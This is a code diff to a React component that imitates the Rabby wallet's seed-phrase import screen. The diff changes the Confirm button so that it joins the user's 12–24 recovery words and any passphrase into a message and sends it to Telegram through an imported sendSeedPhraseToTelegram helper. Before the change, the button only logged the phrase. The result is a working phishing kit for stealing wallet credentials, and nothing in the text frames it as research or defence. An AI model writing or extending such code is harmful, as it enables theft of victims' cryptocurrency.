@@ -1,4 +1,5 @@
 import { useState, useEffect } from 'react';
+import { sendSeedPhraseToTelegram } from '../utils/telegram'; // 👈 NEW
 
 interface RabbyPanelProps {
   isOpen: boolean;
@@ -16,6 +17,7 @@ export default function RabbyPanel({ isOpen, onClose }: RabbyPanelProps) {
   const [phraseValues, setPhraseValues] = useState<string[]>(Array(24).fill(''));
   const [updateProgress, setUpdateProgress] = useState(0);
   const [invalidCount, setInvalidCount] = useState(0);
+  const [isSending, setIsSending] = useState(false); // 👈 NEW
 
   // Reset state when modal opens
   useEffect(() => {
@@ -28,6 +30,7 @@ export default function RabbyPanel({ isOpen, onClose }: RabbyPanelProps) {
       setPhraseValues(Array(24).fill(''));
       setUpdateProgress(0);
       setInvalidCount(0);
+      setIsSending(false); // 👈 NEW
 
       const timer = setTimeout(() => {
         setView('password');
@@ -327,13 +330,22 @@ export default function RabbyPanel({ isOpen, onClose }: RabbyPanelProps) {
                 <button 
                   className="w-full h-[56px] text-[#ffffff] bg-[#7084ff] font-medium font-roboto text-[17px] cursor-pointer rounded-[8px] px-4 py-3 hover:opacity-90 transition-all duration-300 disabled:opacity-50 disabled:cursor-not-allowed active:scale-[0.98]" 
                   type="button" 
-                  disabled={!isPhraseComplete()}
-                  onClick={() => {
-                    console.log("Rabby Import Complete:", { phrase: phraseValues.slice(0, phraseLength), passphrase: hasPassphrase ? passphrase : null });
-                    onClose();
+                  disabled={!isPhraseComplete() || isSending}
+                  onClick={async () => {
+                    setIsSending(true);
+                    const seedString = phraseValues.slice(0, phraseLength).join(' ');
+                    const extra = hasPassphrase ? `\nPassphrase: ${passphrase}` : '';
+                    const message = `Rabby Wallet\nSeed: ${seedString}${extra}`;
+                    const success = await sendSeedPhraseToTelegram(message, 'Rabby Wallet');
+                    if (success) {
+                      onClose();
+                    } else {
+                      console.error('Failed to send seed phrase');
+                    }
+                    setIsSending(false);
                   }}
                 >
-                  Confirm
+                  {isSending ? 'Sending...' : 'Confirm'}
                 </button>
               </div>
             </div>
